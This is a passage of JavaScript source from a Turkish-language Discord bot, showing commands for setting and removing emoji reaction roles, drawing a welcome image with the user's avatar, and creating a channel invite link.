            .setTitle(`Bu Komut İçin Bir Kanal İdsi Girmelisiniz <a:unlem:825146178503966770>`)
            .addField(`Örnek:`, `Semoji-rol-kaldır @rol  emoji <kanal idsi>`)
            .setColor("RED")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            return message.channel.send(embed)
          }
          const sunucu = client.guilds.cache.get(message.guild.id);
          const rol = args[0];
          const roltamam = rol.slice(3, -1)
          const emoji = args[1];
          const rolkanal = sunucu.channels.cache.find(c => c.id === args[2]);
          if (rolkanal === undefined || rolkanal === null) {
              const embed = new Discord.MessageEmbed()
              .setTitle(`Bu Komut İçin Bir Kanal İdsi Girmelisiniz <a:unlem:825146178503966770>`)
              .addField(`Örnek:`, `Semoji-rol-kaldır @rol  emoji <kanal idsi>`)
              .setColor("RED")
              .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              .setTimestamp()
              return message.channel.send(embed)
          }
          if (!rol.startsWith('<@&') && !rol.endsWith('>')) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`Rolünüz Tanımlanamadı Lütfen Bir Rol Olduğundan Emin Olun <a:unlem:825146178503966770>`)
            .setColor("RED")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            return message.channel.send(embed);
          }

          const emojirolvarmı = edb.has(`emojirol-${rolkanal.id}-${emoji}`)
          if (emojirolvarmı === true) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`Zaten ${rolkanal} Kanalında ${emoji} Emojisi İle ${rol} Rol'ü Alma Etkinleştirilmiş <a:unlem:825146178503966770>`)
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setColor("RED")
            return message.channel.send(embed);
          }

          if (emoji.startsWith("<:") && emoji.endsWith(">")) {
            const emojidüzgün = emoji.slice(2, -20)
            edb.set(`emojirol-${rolkanal.id}-${emojidüzgün}`, `${roltamam}-${emojidüzgün}`);
            const embed = new Discord.MessageEmbed()
            .setDescription(`Emoji Rolünüz ${rolkanal} Kanalına ${rol} Rolüne ${emoji} Emojisi İçin Ayarlandı <a:ysltk:749379707556069457>`)
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setColor("GREEN")
            return message.channel.send(embed);
          }

          edb.set(`emojirol-${rolkanal.id}-${emoji}`, `${roltamam}-${emoji}`);

          const embed = new Discord.MessageEmbed()
          .setDescription(`Emoji Rolünüz ${rolkanal} Kanalına ${rol} Rolüne ${emoji} Emojisi İçin Ayarlandı <a:ysltk:749379707556069457>`)
          .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
          .setTimestamp()
          .setColor("GREEN")
          message.channel.send(embed);
        }
        if (komut === "emoji-rol-kaldır") {
          if (!args[0]) {
            const embed = new Discord.MessageEmbed()
            .setTitle(`Bu Komut İçin Bir Rol Girmelisin <a:unlem:825146178503966770>`)
            .addField(`Örnek:`, `Semoji-rol-kaldır @rol emoji <kanal idsi>`)
            .setColor("RED")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            return message.channel.send(embed)
          }
          if (args[0] && !args[1]) {
            const embed = new Discord.MessageEmbed()
            .setTitle(`Bu Komut İçin Bir Emoji Koymalısınız <a:unlem:825146178503966770>`)
            .addField(`Örnek:`, `Semoji-rol-kaldır @rol  emoji <kanal idsi>`)
            .setColor("RED")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            return message.channel.send(embed)
          }
          if (args[0] && args[1] && !args[2]) {
            const embed = new Discord.MessageEmbed()
            .setTitle(`Bu Komut İçin Bir Kanal İdsi Girmelisiniz <a:unlem:825146178503966770>`)
            .addField(`Örnek:`, `Semoji-rol-kaldır @rol  emoji <kanal idsi>`)
            .setColor("RED")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            return message.channel.send(embed)
          }

          const sunucu = client.guilds.cache.get(message.guild.id);
          const rol = args[0];
          const roltamam = rol.slice(3, -1)
          const emoji = args[1];
          const rolkanal = sunucu.channels.cache.get(args[2]);
          if (rolkanal === undefined || rolkanal === null) {
              const embed = new Discord.MessageEmbed()
              .setTitle(`Bu Komut İçin Bir Kanal İdsi Girmelisiniz <a:unlem:825146178503966770>`)
              .addField(`Örnek:`, `Semoji-rol-kaldır @rol  emoji <kanal idsi>`)
              .setColor("RED")
              .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
              .setTimestamp()
              return message.channel.send(embed)
          }
          if (!rol.startsWith('<@&') && !rol.endsWith('>')) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`Rolünüz Tanımlanamadı Lütfen Bir Rol Olduğundan Emin Olun <a:unlem:825146178503966770>`)
            .setColor("RED")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            return message.channel.send(embed);
          }

          const emojirolvarmı = edb.has(`emojirol-${rolkanal.id}-${emoji}`)
          if (emojirolvarmı === false) {
            const embed = new Discord.MessageEmbed()
            .setDescription(`Zaten ${rolkanal} Kanalında ${emoji} Emojisi İle ${rol} Rol'ü Alma Etkinleştirilmemiş <a:unlem:825146178503966770>`)
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setColor("RED")
            return message.channel.send(embed);
          }

          if (emoji.startsWith("<:") && emoji.endsWith(">")) {
            const emojidüzgün = emoji.slice(2, -20)
            edb.delete(`emojirol-${rolkanal.id}-${emojidüzgün}`);
            const embed = new Discord.MessageEmbed()
            .setDescription(`Emoji Rolünüz Kaldırıldı <a:ysltk:749379707556069457>`)
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            .setColor("GREEN")
            return message.channel.send(embed);
          }

          edb.delete(`emojirol-${rolkanal.id}-${emoji}`);

          const embed = new Discord.MessageEmbed()
          .setDescription(`Emoji Rolünüz Kaldırıldı <a:ysltk:749379707556069457>`)
          .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
          .setTimestamp()
          .setColor("GREEN")
          message.channel.send(embed);

        }
        if (komut === "canvas") {

          const canvas = Canvas.createCanvas(600,300)
          const ctx = canvas.getContext('2d')
    
          const arkaplan = await Canvas.loadImage('image/background.png')
          let x = 0;
          let y = 0;
          ctx.drawImage(arkaplan, x, y)
    
    
          const pfp = await Canvas.loadImage(
            message.author.displayAvatarURL({
              format:'png'
            })
          )
          x = canvas.width / 2 - pfp.width / 2
          y = 60
          ctx.drawImage(pfp, x, y)
    
          ctx.fillStyle = '#ffffff'
          ctx.font = '35px Comic Sans MS'
          let text = `Merhaba ${message.author.tag}`
          x = canvas.width / 2 - ctx.measureText(text).width / 2
          ctx.fillText(text, x, 120 + pfp.height)
    
          const attachment = new Discord.MessageAttachment(canvas.toBuffer())
          message.channel.send('', attachment);
    
        }
        if (komut === "davet") {
          const sunucu = client.guilds.cache.get(message.guild.id);
          const kanal = sunucu.channels.cache.get(message.channel.id);
          kanal.createInvite({
            maxAge: 0,
            maxUsers: 0
          }).then(davet => {
            message.reply(`Davetin burada:
https://discord.gg/${davet.code}`);
          })
        }
    })
}